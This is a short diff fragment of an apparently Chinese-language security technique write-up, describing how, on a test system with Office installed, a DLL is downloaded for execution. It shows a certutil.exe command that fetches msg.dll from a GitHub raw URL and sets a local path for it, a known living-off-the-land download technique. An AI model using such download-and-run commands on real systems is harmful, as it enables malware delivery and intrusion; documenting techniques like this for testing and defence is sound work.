@@ -15,6 +15,7 @@
 
 测试系统安装Office软件，下载执行dll对应的powershell代码如下：
 
+
      ```certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll```
      
 PS   ```$path="C:\Users\Administrator\msg.dll"```
